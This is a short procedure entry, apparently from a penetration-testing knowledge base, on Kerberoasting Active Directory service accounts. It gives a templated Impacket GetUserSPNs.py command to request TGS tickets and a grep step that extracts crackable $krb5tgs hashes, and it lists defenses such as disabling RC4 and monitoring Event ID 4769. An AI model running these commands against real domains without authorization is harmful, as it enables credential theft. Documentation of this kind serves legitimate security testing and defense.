---
id: 588255c0-9513-4cee-bdad-6eb2ed7c5da2
name: Kerberoast-Service-Accounts-in-Domain
type: procedure
verified: true
submitted: false
created_at: '2019-12-04T19:39:54.389336+00:00'
updated_at: '2023-05-29T16:48:53.253841+00:00'
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
techniques:
  - '[[techniques/Kerberoasting|T1558.003 - Kerberoasting]]'
sub_techniques: []
platforms:
  - Windows
tags:
  - known-vulnerability
  - network
  - service-attacks
commands:
  - '[[commands/getuserspns-kerberoast-spns-and-dump-hashes]]'
tools:
  - '[[tools/Impacket]]'
validated: true
---

# Kerberoast-Service-Accounts-in-Domain

## Summary

This procedure queries AD for service principal names (SPNs) and requests TGS tickets, dumping crackable hashes for offline attacks.

## Description

Kerberoasting exploits Kerberos by requesting service tickets for SPN accounts, which use RC4-HMAC (weak) encryption based on account passwords. Any domain user can request these, yielding hashes for cracking.

## Requirements

- Valid domain user creds
- DC IP
- Impacket GetUserSPNs.py

## Defense

- Use long, complex passwords for service accounts
- Enable AES encryption only (disable RC4)
- Monitor Kerberos ticket requests (Event ID 4769)

## Objectives

1. Enumerate SPNs
2. Request TGS tickets
3. Export hashes

## Instructions

### Step 1: Query and Request Tickets

**Context**: -request flag dumps TGS-REP hashes.

**Command** ([[commands/getuserspns-kerberoast-spns-and-dump-hashes]]):
```bash
GetUserSPNs.py '$_DOMAIN/$_USERNAME:$_PASSWORD' -dc-ip $_DOMAIN_IP -request
```

> Outputs SPNs and $krb5tgs$ hashes; save to file.

### Step 2: Prepare for Cracking

**Context**: Filter hashes for cracking.

grep '$krb5tgs' output.txt > hashes.txt.

> Success if hashes extracted.
